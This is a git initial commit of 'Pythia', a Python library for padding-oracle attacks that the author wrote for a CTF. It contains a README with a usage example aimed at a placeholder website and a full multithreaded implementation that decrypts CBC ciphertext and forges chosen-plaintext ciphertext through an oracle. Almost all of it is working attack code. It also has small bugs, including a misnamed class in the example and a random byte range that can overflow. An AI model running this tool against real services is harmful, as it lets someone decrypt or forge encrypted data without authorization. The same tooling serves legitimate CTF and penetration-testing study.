f79c99e5a9262fb2c95543967c5ac201ac9c64b0
oldrho <oldrho@oldrho.com>
2020-08-04 00:14:52 -0700

    Initial commit

---
+++ README.md
@@ -0,0 +1,31 @@
+# Pythia
+
+*Under Development*
+
+## Description
+
+> To those who ask for oracles
+> Let the God's answer come
+>    - Pythian Priests
+
+While completing a CTF recently I needed to exploit a padding oracle with custom encoding and then further exploit another service through it. While I had some success with already available scripts, they were very slow. They also did not integrate well with the rest of the attack chain and required a lot of hands-on work.
+
+I am developing `Pythia` as a Python library rather than a command line tool to make customization as simple as possible. It supports decrypting existing ciphertext and encrypting chosen plaintext using an oracle. It expects an oracle function that is responsible for the request and detecting the oracle response.
+
+## Usage
+
+```python
+import pythia
+import requests
+
+def oracle(data):
+	url = b'http://website.example/?data=' + data.hex()
+	response = requests.get(url)
+	return not b'Padding Error' in response.text
+
+stream = Pythia.Stream(16, oracle, threads=100)
+decrypted = stream.decrypt(ciphertext)
+encrypted = stream.encrypt(plaintext)
+```
+
+Pythia works purely on `bytes`. Any encoding (Hex, Base64, UTF-8, etc) must be done by the oracle function. The oracle function responds `True` when a valid response is received and `False` when a padding error is detected.
---
+++ pythia.py
@@ -0,0 +1,147 @@
+#!/usr/bin/env python3
+
+import base64
+import sys
+import requests
+import time
+import queue
+import threading
+import random
+import json
+
+
+
+class Stream:
+	def __init__(self, block_length, oracle, threads=100, verbose=False):
+		self.block_length = block_length
+		self.oracle = oracle
+		self.threads = threads
+		self.verbose = verbose
+
+	def decrypt(self, data):
+		bl = self.block_length
+		self.blocks = [Block(self, data[i*bl:i*bl+bl], index=i) for i in range(len(data)//bl)]
+		if len(self.blocks) < 2:
+			raise Exception
+
+		# Get all intermediate values
+		for block in self.blocks[1:][::-1]:
+			if self.verbose:
+				print("Decrypting block %d" % block.index)
+			block.get_intermediate()
+
+		# Decrypt ciphertexts and concatenate plaintexts
+		result = bytes(sum([block.decrypt() for block in self.blocks[1:]],[]))
+
+		# Validate padding
+		pad_value = result[-1]
+		if pad_value == 0 or pad_value > 16:
+			raise Exception
+		if not all([x == pad_value for x in result[-pad_value:]]):
+			raise Exception
+
+		return bytes(result[:-pad_value])
+
+	def encrypt(self, data):
+		bl = self.block_length
+
+		# Convert and pad list correctly
+		data = list(data)
+		pad_value = bl-(len(data)%bl)
+		if pad_value == 0:
+			pad_value = 16
+		data += [pad_value]*pad_value
+
+		# Block count = IV + final ciphertext
+		block_count = len(data)//bl
+
+		# Create a random ciphertext block
+		ciphertext = [random.randint(0,256) for x in range(bl)]
+		result = ciphertext
+
+		for i in range(block_count):
+			block = Block(self, ciphertext)
+
+			# Get the intermediate values
+			block.get_intermediate()
+
+			# Get plaintext to encrypt
+			plaintext = data[-i*bl-bl:][:bl]
+
+			# Create the ciphertext for the previous block that will XOR to give
+			# the correct plaintext for this block
+			ciphertext = block.encrypt_iv(plaintext)
+
+			# Prepend the ciphertext to the result
+			result = ciphertext + result
+
+			if self.verbose:
+				print("Encrypted block %d" % (block_count-i))
+
+		return bytes(result)
+
+
+
+
+
+class Block:
+	def __init__(self, stream, ciphertext, index=None):
+		self.stream = stream
+		self.ciphertext = ciphertext
+		self.index = index
+
+		self.I = [0]*self.stream.block_length
+
+	def get_intermediate(self):
+		for n in range(1,self.stream.block_length + 1):
+			self.get_position(n)
+
+	def get_position(self, position):
+		zeros = [0]*(self.stream.block_length-position)
+		known = [position ^ i for i in self.I[-position+1:]][:position-1]
+
+		result = [False]
+
+		# Queue all guesses
+		q = queue.Queue()
+		for guess in range(0,256):
+			q.put(guess)
+
+		def threadfunc():
+			while not q.empty():
+				guess = q.get()
+
+				# Create guess block
+				guessblock = zeros + [position^guess] + known
+
+				# Create guess message
+				message = bytes(guessblock) + bytes(self.ciphertext)
+
+				# Ask the oracle
+				if self.stream.oracle(message):
+					result[0] = guess
+					self.I[-position] = result[0]
+
+					with q.mutex:
+						q.queue.clear()
+					break
+
+		threads = []
+		for x in range(self.stream.threads):
+			thread = threading.Thread(target=threadfunc)
+			thread.start()
+			threads.append(thread)
+
+		for thread in threads:
+			thread.join()
+
+		return result[0]
+
+	def decrypt(self):
+		return [a^b for a,b in zip(self.stream.blocks[self.index-1].ciphertext, self.I)]
+	
+	def encrypt_iv(self, plaintext):
+		if len(plaintext) != self.stream.block_length:
+			raise Exception
+
+		return [a^b for a,b in zip(plaintext, self.I)]
